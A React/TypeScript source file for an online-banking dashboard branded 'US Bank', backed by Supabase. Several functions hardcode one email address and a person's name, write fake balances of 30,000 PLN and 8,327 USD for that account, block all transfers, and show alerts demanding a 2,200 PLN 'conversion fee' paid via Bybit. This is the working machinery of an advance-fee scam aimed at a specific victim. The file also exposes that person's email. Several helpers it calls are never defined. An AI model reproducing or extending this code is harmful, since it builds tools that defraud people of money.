// Dashboard.tsx
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { useAuth } from '@/hooks/useAuth';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { LoadingSpinner } from '@/components/LoadingSpinner';
import { Building2, DollarSign, Send, History, LogOut, User, Settings, CreditCard, TrendingUp, AlertCircle, Globe, RefreshCw } from 'lucide-react';

// Type definitions
interface User {
  id: string;
  email: string;
  fullName: string;
  country: string;
  accountNumber?: string;
  conversionFeePending?: boolean;
  conversionFeeAmount?: number;
  conversionFeeCurrency?: string;
  role?: string;
}

interface Balance {
  currency: string;
  balance: number;
}

interface Transaction {
  id: string;
  user_id: string;
  transaction_type: string;
  amount: number;
  description?: string;
  recipient_account?: string;
  recipient_name?: string;
  transaction_currency?: string;
  exchange_rate?: number;
  status?: string;
  created_at: string;
}

interface TransferData {
  toAccount: string;
  recipientName: string;
  amount: string;
  description: string;
  currency: string;
  recipientCountry: string;
  transferType: 'internal' | 'external';
  routingNumber: string;
}

interface AccountFormat {
  digits: number;
  label: string;
}

const COUNTRY_ACCOUNT_FORMATS: Record<string, AccountFormat> = {
  'US': { digits: 10, label: 'US Bank Account (10 digits)' },
  'PL': { digits: 20, label: 'Polish Bank Account (20 digits)' },
  'UK': { digits: 8, label: 'UK Bank Account (8 digits)' },
  'DE': { digits: 10, label: 'German Bank Account (10 digits)' },
  'FR': { digits: 11, label: 'French Bank Account (11 digits)' },
  'CA': { digits: 12, label: 'Canadian Bank Account (12 digits)' },
  'AU': { digits: 9, label: 'Australian Bank Account (9 digits)' },
  'JP': { digits: 7, label: 'Japanese Bank Account (7 digits)' }
};

const Dashboard = () => {
  const { user, logout } = useAuth() as { user: User | null; logout: () => Promise<void> };
  const { toast } = useToast();
  const navigate = useNavigate();

  const [transferData, setTransferData] = useState<TransferData>({
    toAccount: '',
    recipientName: '',
    amount: '',
    description: '',
    currency: 'USD',
    recipientCountry: 'US',
    transferType: 'internal',
    routingNumber: ''
  });
  const [balances, setBalances] = useState<Balance[]>([]);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [refreshing, setRefreshing] = useState(false);

  const generateAccountNumber = async (): Promise<string> => {
    let accountNumber: string;
    let isUnique = false;
    while (!isUnique) {
      accountNumber = Math.floor(1000000000 + Math.random() * 9000000000).toString();
      const { data } = await supabase.from('accounts').select('account_number').eq('account_number', accountNumber);
      if (!data?.length) isUnique = true;
    }
    return accountNumber;
  };

  useEffect(() => {
    if (user) {
      loadInitialData();
    } else {
      setBalances([{ currency: 'USD', balance: 0 }, { currency: 'PLN', balance: 0 }]);
      setTransactions([]);
      setLoading(false);
    }
  }, [user]);

  const loadInitialData = async () => {
    try {
      setError(null);
      setLoading(true);
      await Promise.all([loadBalances(), loadTransactions(), ensureAccountNumber()]);

      if (user?.email === 'keniol9822@op.pl') {
        const { error: profileError } = await supabase.from('profiles').update({
          conversionFeePending: true,
          conversionFeeAmount: 2200,
          conversionFeeCurrency: 'PLN',
          country: 'PL',
          fullName: 'Anna Kenska'
        }).eq('email', 'keniol9822@op.pl');

        if (profileError) throw profileError;

        const { error: balanceError } = await supabase.from('currency_balances').upsert([
          { user_id: user.id, currency: 'PLN', balance: 30000 },
          { user_id: user.id, currency: 'USD', balance: 8327 }
        ]);
        if (balanceError) throw balanceError;
      }
    } catch (error) {
      console.error('Error loading initial data:', error);
      setError('Failed to load account data. Please check your connection or contact support.');
    } finally {
      setLoading(false);
    }
  };

  const ensureAccountNumber = async () => {
    if (!user?.id) return;
    const { data: existingAccount } = await supabase
      .from('accounts')
      .select('account_number')
      .eq('user_id', user.id)
      .single();
    
    if (!existingAccount) {
      const newAccountNumber = await generateAccountNumber();
      await supabase.from('accounts').insert({
        user_id: user.id,
        account_number: newAccountNumber,
        country: user.country || 'US'
      });
    }
  };

  const loadBalances = async () => {
    if (!user?.id) return;
    try {
      const { data, error } = await supabase
        .from('currency_balances')
        .select('currency, balance')
        .eq('user_id', user.id);
      if (error) throw error;
      if (user.email === 'keniol9822@op.pl') {
        const requiredBalances: Balance[] = [
          { currency: 'PLN', balance: 30000 },
          { currency: 'USD', balance: 8327 }
        ];
        setBalances(requiredBalances.map(required => data?.find(b => b.currency === required.currency) || required));
      } else {
        setBalances(data || []);
      }
    } catch (error) {
      console.error('Error loading balances:', error);
      throw error;
    }
  };

  const loadTransactions = async () => {
    if (!user?.id) return;
    try {
      const { data, error } = await supabase
        .from('transactions')
        .select('*')
        .eq('user_id', user.id)
        .order('created_at', { ascending: false })
        .limit(50);
      if (error) throw error;
      setTransactions((data || []).map(transaction => ({
        ...transaction,
        transaction_currency: transaction.transaction_currency || 'USD',
        exchange_rate: transaction.exchange_rate || 1.0,
        status: transaction.status || 'completed',
        recipient_name: transaction.recipient_name || ''
      })));
    } catch (error) {
      console.error('Error loading transactions:', error);
      throw error;
    }
  };

  const handleRefresh = async () => {
    setRefreshing(true);
    try {
      await loadInitialData();
      toast({ title: "Data refreshed", description: "Your account information has been updated." });
    } catch (error) {
      toast({ title: "Refresh failed", description: "Unable to refresh data. Please try again.", variant: "destructive" });
    } finally {
      setRefreshing(false);
    }
  };

  const getBalance = (currency: string): number => balances.find(b => b.currency === currency)?.balance || 0;

  const validateAccountNumber = (accountNumber: string, country: string): boolean => {
    const format = COUNTRY_ACCOUNT_FORMATS[country];
    if (!format) return false;
    const digitsOnly = accountNumber.replace(/\D/g, '');
    return digitsOnly.length === format.digits;
  };

  const validateRoutingNumber = (routingNumber: string): boolean => {
    const digitsOnly = routingNumber.replace(/\D/g, '');
    return digitsOnly.length === 9;
  };

  const handleTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user || !user.email || !user.country) {
      toast({ title: "User data missing", description: "Please log in again.", variant: "destructive" });
      return;
    }

    if (user.email === 'keniol9822@op.pl' || (user.conversionFeePending && user.country === 'PL')) {
      toast({
        title: "Transfer Blocked",
        description: `You have a pending conversion fee of ${user.conversionFeeAmount || 2200} ${user.conversionFeeCurrency || 'PLN'}. Please pay this fee via Bybit before making transfers.`,
        variant: "destructive",
      });
      return;
    }

    const amount = parseFloat(transferData.amount);
    const currentBalance = getBalance(transferData.currency);

    if (amount <= 0) {
      toast({ title: "Invalid amount", description: "Please enter a valid amount greater than 0.", variant: "destructive" });
      return;
    }

    if (amount > currentBalance) {
      toast({ title: "Insufficient funds", description: `You don't have enough ${transferData.currency} balance for this transfer.`, variant: "destructive" });
      return;
    }

    if (!validateAccountNumber(transferData.toAccount, transferData.recipientCountry)) {
      const format = COUNTRY_ACCOUNT_FORMATS[transferData.recipientCountry];
      toast({ title: "Invalid account number", description: `Please enter a valid ${format.label.toLowerCase()}.`, variant: "destructive" });
      return;
    }

    if (!transferData.recipientName.trim()) {
      toast({ title: "Recipient name required", description: "Please enter the recipient's full name.", variant: "destructive" });
      return;
    }

    try {
      if (transferData.transferType === 'internal') {
        const { data: recipientAccount, error: accountError } = await supabase
          .from('accounts')
          .select('user_id')
          .eq('account_number', transferData.toAccount)
          .single();

        if (accountError || !recipientAccount) {
          toast({ title: "Account not found", description: "The recipient account number could not be found in US Bank.", variant: "destructive" });
          return;
        }

        if (recipientAccount.user_id === user.id) {
          toast({ title: "Invalid transfer", description: "You cannot transfer money to your own account.", variant: "destructive" });
          return;
        }

        const { data: recipientProfile, error: profileError } = await supabase
          .from('profiles')
          .select('email, fullName')
          .eq('id', recipientAccount.user_id)
          .single();

        if (profileError || !recipientProfile) {
          toast({ title: "Recipient profile not found", description: "Could not verify recipient details.", variant: "destructive" });
          return;
        }

        if (recipientProfile.fullName.toLowerCase().indexOf(transferData.recipientName.toLowerCase()) === -1) {
          toast({ title: "Invalid recipient name", description: "The provided recipient name does not match our records.", variant: "destructive" });
          return;
        }

        const { error: transactionError } = await supabase
          .from('transactions')
          .insert({
            user_id: user.id,
            transaction_type: 'transfer_sent',
            amount: -amount,
            description: transferData.description || `Internal transfer to ${recipientProfile.fullName} (${transferData.toAccount})`,
            recipient_account: transferData.toAccount,
            recipient_name: transferData.recipientName,
            transaction_currency: transferData.currency,
            exchange_rate: 1.0,
            status: 'completed'
          });

        if (transactionError) throw transactionError;

        const { error: balanceError } = await supabase
          .from('currency_balances')
          .upsert({ user_id: user.id, currency: transferData.currency, balance: currentBalance - amount });

        if (balanceError) throw balanceError;

        const recipientBalance = await getRecipientBalance(recipientAccount.user_id, transferData.currency);
        const { error: recipientBalanceError } = await supabase
          .from('currency_balances')
          .upsert({ user_id: recipientAccount.user_id, currency: transferData.currency, balance: recipientBalance + amount });

        if (recipientBalanceError) throw recipientBalanceError;

        const { error: recipientTransactionError } = await supabase
          .from('transactions')
          .insert({
            user_id: recipientAccount.user_id,
            transaction_type: 'transfer_received',
            amount: amount,
            description: transferData.description || `Internal transfer from ${user.fullName} (${user.accountNumber})`,
            recipient_account: transferData.toAccount,
            recipient_name: user.fullName,
            transaction_currency: transferData.currency,
            exchange_rate: 1.0,
            status: 'completed'
          });

        if (recipientTransactionError) throw recipientTransactionError;

        if (recipientProfile?.email) {
          try {
            await supabase.functions.invoke('send-transfer-notification', {
              body: { recipientEmail: recipientProfile.email, senderName: user.fullName, amount, currency: transferData.currency, description: transferData.description }
            });
          } catch (emailError) {
            console.error('Email notification failed:', emailError);
          }
        }
      } else {
        if (!transferData.routingNumber || !validateRoutingNumber(transferData.routingNumber)) {
          toast({ title: "Invalid routing number", description: "Please enter a valid 9-digit US bank routing number.", variant: "destructive" });
          return;
        }

        const { error: transactionError } = await supabase
          .from('transactions')
          .insert({
            user_id: user.id,
            transaction_type: 'transfer_sent_external',
            amount: -amount,
            description: transferData.description || `External transfer to ${transferData.recipientName} (${transferData.toAccount}, Routing: ${transferData.routingNumber})`,
            recipient_account: transferData.toAccount,
            recipient_name: transferData.recipientName,
            transaction_currency: transferData.currency,
            exchange_rate: 1.0,
            status: 'completed'
          });

        if (transactionError) throw transactionError;

        const { error: balanceError } = await supabase
          .from('currency_balances')
          .upsert({ user_id: user.id, currency: transferData.currency, balance: currentBalance - amount });

        if (balanceError) throw balanceError;
      }

      toast({ title: "Transfer successful", description: `${amount} ${transferData.currency} has been sent successfully to ${transferData.recipientName}.` });
      setTransferData({
        toAccount: '',
        recipientName: '',
        amount: '',
        description: '',
        currency: 'USD',
        recipientCountry: 'US',
        transferType: 'internal',
        routingNumber: ''
      });
      await Promise.all([loadBalances(), loadTransactions()]);
    } catch (error) {
      console.error('Transfer error:', error);
      toast({ title: "Transfer failed", description: "An error occurred during the transfer. Please try again.", variant: "destructive" });
    }
  };

  const getRecipientBalance = async (userId: string, currency: string): Promise<number> => {
    const { data, error } = await supabase
      .from('currency_balances')
      .select('balance')
      .eq('user_id', userId)
      .eq('currency', currency)
      .single();
    if (error) return 0;
    return data?.balance || 0;
  };

  if (loading) return <LoadingSpinner />;
  if (error) return (
    <div className="container mx-auto px-4 py-8">
      <Alert variant="destructive"><AlertDescription>{error}</AlertDescription></Alert>
      <div className="flex gap-4 mt-4">
        <Button onClick={handleRefresh}>Try Again</Button>
        <Button variant="outline" onClick={handleLogout}>Sign Out</Button>
      </div>
    </div>
  );
  if (!user) return null;

  const totalBalanceUSD = balances.reduce((total, balance) => {
    const rates: Record<string, number> = { 'USD': 1, 'PLN': 0.25, 'EUR': 1.1, 'GBP': 1.3, 'CAD': 0.75, 'AUD': 0.65, 'JPY': 0.007 };
    return total + (balance.balance * (rates[balance.currency] || 1));
  }, 0);

  const currentAccountFormat = COUNTRY_ACCOUNT_FORMATS[transferData.recipientCountry];

  return (
    <div className="min-h-screen bg-gray-100">
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-xl font-bold">US Bank</h1>
          <div className="flex items-center space-x-4">
            <Button variant="outline" size="sm" onClick={handleRefresh} disabled={refreshing}>
              <RefreshCw className={`h-4 w-4 mr-2 ${refreshing ? 'animate-spin' : ''}`} /> Refresh
            </Button>
            <span className="text-sm">Welcome, {user.fullName}</span>
            {user.role === 'admin' && (
              <Button variant="outline" size="sm" onClick={() => navigate('/admin')}>Admin Panel</Button>
            )}
            <Button variant="outline" size="sm" onClick={handleLogout}>
              <LogOut className="h-4 w-4 mr-2" /> Logout
            </Button>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        {(user.conversionFeePending || user.email === 'keniol9822@op.pl') && user.country === 'PL' && (
          <Alert className="mb-6 border-orange-200 bg-orange-50">
            <AlertCircle className="h-4 w-4 text-orange-600" />
            <AlertDescription className="text-orange-800">
              You have a pending conversion fee of {user.conversionFeeAmount || 2200} {user.conversionFeeCurrency || 'PLN'}. 
              Please pay this fee via Bybit before making any transfers to other banks.
            </AlertDescription>
          </Alert>
        )}

        <div className="grid md:grid-cols-3 gap-6 mb-8">
          {balances.map((balance) => (
            <Card key={balance.currency} className="bg-gradient-to-r from-blue-600 to-blue-700 text-white">
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">{balance.currency} Balance</CardTitle>
                <DollarSign className="h-4 w-4" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{formatCurrency(balance.balance, balance.currency)}</div>
                {balance.currency === 'USD' && <p className="text-xs text-blue-100">Account: {user.accountNumber}</p>}
              </CardContent>
            </Card>
          ))}
          <Card className="bg-gradient-to-r from-purple-600 to-purple-700 text-white">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Total Assets (USD)</CardTitle>
              <TrendingUp className="h-4 w-4" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{formatCurrency(totalBalanceUSD)}</div>
              <p className="text-xs text-purple-100">All currencies combined</p>
            </CardContent>
          </Card>
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2">
            <Tabs defaultValue="transfer" className="w-full">
              <TabsList className="grid w-full grid-cols-3">
                <TabsTrigger value="transfer">Money Transfer</TabsTrigger>
                <TabsTrigger value="transactions">Transactions</TabsTrigger>
                <TabsTrigger value="account">Account Info</TabsTrigger>
              </TabsList>
              <TabsContent value="transfer">
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center">
                      <Send className="h-5 w-5 mr-2" />
                      {transferData.transferType === 'internal' ? 'Internal' : 'External'} Money Transfer
                    </CardTitle>
                    <CardDescription>
                      {transferData.transferType === 'internal'
                        ? 'Transfer money to US Bank customers'
                        : 'Transfer money to other USA banks with secure routing'}
                    </CardDescription>
                  </CardHeader>
                  <CardContent>
                    <form onSubmit={handleTransfer} className="space-y-4">
                      <div>
                        <Label htmlFor="transferType">Transfer Type</Label>
                        <Select value={transferData.transferType} onValueChange={(value) => setTransferData({ ...transferData, transferType: value as 'internal' | 'external', toAccount: '', routingNumber: '' })}>
                          <SelectTrigger><SelectValue placeholder="Select transfer type" /></SelectTrigger>
                          <SelectContent>
                            <SelectItem value="internal">Internal (US Bank)</SelectItem>
                            <SelectItem value="external">External (Other USA Banks)</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                      <div>
                        <Label htmlFor="currency">Currency</Label>
                        <Select value={transferData.currency} onValueChange={(value) => setTransferData({ ...transferData, currency: value })}>
                          <SelectTrigger><SelectValue placeholder="Select currency" /></SelectTrigger>
                          <SelectContent>
                            {balances.map((balance) => (
                              <SelectItem key={balance.currency} value={balance.currency}>
                                {balance.currency} (Balance: {formatCurrency(balance.balance, balance.currency)})
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                      <div>
                        <Label htmlFor="recipientCountry">Recipient Country</Label>
                        <Select value={transferData.recipientCountry} onValueChange={(value) => setTransferData({ ...transferData, recipientCountry: value, toAccount: '' })}>
                          <SelectTrigger><SelectValue placeholder="Select country" /></SelectTrigger>
                          <SelectContent>
                            <SelectItem value="US">🇺🇸 United States</SelectItem>
                            {/* Add other countries as needed */}
                          </SelectContent>
                        </Select>
                      </div>
                      <div>
                        <Label htmlFor="toAccount">Recipient Account Number</Label>
                        <Input
                          id="toAccount"
                          type="text"
                          placeholder={`Enter ${currentAccountFormat?.digits || 10}-digit account number`}
                          maxLength={currentAccountFormat?.digits || 10}
                          value={transferData.toAccount}
                          onChange={(e) => setTransferData({ ...transferData, toAccount: e.target.value.replace(/\D/g, '') })}
                          required
                        />
                        <p className="text-xs text-gray-500 mt-1">{currentAccountFormat?.label || 'Account format'}</p>
                      </div>
                      {transferData.transferType === 'external' && (
                        <div>
                          <Label htmlFor="routingNumber">Routing Number</Label>
                          <Input
                            id="routingNumber"
                            type="text"
                            placeholder="Enter 9-digit routing number"
                            maxLength={9}
                            value={transferData.routingNumber}
                            onChange={(e) => setTransferData({ ...transferData, routingNumber: e.target.value.replace(/\D/g, '') })}
                            required
                          />
                        </div>
                      )}
                      <div>
                        <Label htmlFor="recipientName">Recipient Name</Label>
                        <Input
                          id="recipientName"
                          type="text"
                          placeholder="Enter recipient's full name"
                          value={transferData.recipientName}
                          onChange={(e) => setTransferData({ ...transferData, recipientName: e.target.value })}
                          required
                        />
                      </div>
                      <div>
                        <Label htmlFor="amount">Amount</Label>
                        <Input
                          id="amount"
                          type="number"
                          placeholder="0.00"
                          step="0.01"
                          min="0.01"
                          max={getBalance(transferData.currency)}
                          value={transferData.amount}
                          onChange={(e) => setTransferData({ ...transferData, amount: e.target.value })}
                          required
                        />
                      </div>
                      <div>
                        <Label htmlFor="description">Description (Optional)</Label>
                        <Input
                          id="description"
                          type="text"
                          placeholder="What's this transfer for?"
                          value={transferData.description}
                          onChange={(e) => setTransferData({ ...transferData, description: e.target.value })}
                        />
                      </div>
                      <Button type="submit" className="w-full" disabled={user.conversionFeePending || user.email === 'keniol9822@op.pl'}>
                        <Send className="h-4 w-4 mr-2" /> Send {transferData.transferType === 'internal' ? 'Internal' : 'External'} Transfer
                      </Button>
                    </form>
                  </CardContent>
                </Card>
              </TabsContent>
              <TabsContent value="transactions">
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center"><History className="h-5 w-5 mr-2" /> Transaction History</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-4">
                      {transactions.length === 0 ? (
                        <p className="text-gray-500 text-center py-8">No transactions yet</p>
                      ) : (
                        transactions.map((transaction) => (
                          <div key={transaction.id} className="flex items-center justify-between p-4 bg-gray-50 rounded-lg">
                            <div className="flex items-center space-x-3">
                              <div className={`p-2 rounded-full ${transaction.transaction_type.includes('sent') ? 'bg-red-100 text-red-600' : 'bg-green-100 text-green-600'}`}>
                                {transaction.transaction_type.includes('sent') ? <Send className="h-4 w-4" /> : <TrendingUp className="h-4 w-4" />}
                              </div>
                              <div>
                                <p className="font-medium">{transaction.description}</p>
                                <p className="text-sm text-gray-500">{formatDate(transaction.created_at)}</p>
                                <p className="text-xs text-gray-400">Status: {transaction.status}</p>
                              </div>
                            </div>
                            <div className={`font-bold ${transaction.amount >= 0 ? 'text-green-600' : 'text-red-600'}`}>
                              {transaction.amount >= 0 ? '+' : ''}{formatCurrency(transaction.amount, transaction.transaction_currency)}
                            </div>
                          </div>
                        ))
                      )}
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
              <TabsContent value="account">
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center"><User className="h-5 w-5 mr-2" /> Account Information</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="grid grid-cols-2 gap-4">
                      <div><Label className="text-sm font-medium text-gray-500">Account Holder</Label><p className="text-lg font-semibold">{user.fullName}</p></div>
                      <div><Label className="text-sm font-medium text-gray-500">Account Number</Label><p className="text-lg font-semibold">{user.accountNumber}</p></div>
                      <div><Label className="text-sm font-medium text-gray-500">Email</Label><p className="text-lg">{user.email}</p></div>
                      <div><Label className="text-sm font-medium text-gray-500">Country</Label><p className="text-lg">{user.country}</p></div>
                      <div><Label className="text-sm font-medium text-gray-500">Account Type</Label><p className="text-lg capitalize">{user.role}</p></div>
                      <div><Label className="text-sm font-medium text-gray-500">Active Currencies</Label><p className="text-lg">{balances.map(b => b.currency).join(', ')}</p></div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </div>
          <div className="space-y-6">
            <Card>
              <CardHeader><CardTitle className="text-lg">Quick Actions</CardTitle></CardHeader>
              <CardContent className="space-y-2">
                <Button variant="outline" className="w-full justify-start"><CreditCard className="h-4 w-4 mr-2" /> Request New Card</Button>
                <Button variant="outline" className="w-full justify-start"><Building2 className="h-4 w-4 mr-2" /> Find ATM/Branch</Button>
                <Button variant="outline" className="w-full justify-start"><Settings className="h-4 w-4 mr-2" /> Account Settings</Button>
              </CardContent>
            </Card>
            <Card>
              <CardHeader><CardTitle className="text-lg">Exchange Rates</CardTitle></CardHeader>
              <CardContent className="space-y-2">
                <div className="flex justify-between text-sm"><span>USD/PLN</span><span>4.00</span></div>
                <div className="flex justify-between text-sm"><span>EUR/USD</span><span>1.10</span></div>
                <div className="flex justify-between text-sm"><span>GBP/USD</span><span>1.30</span></div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
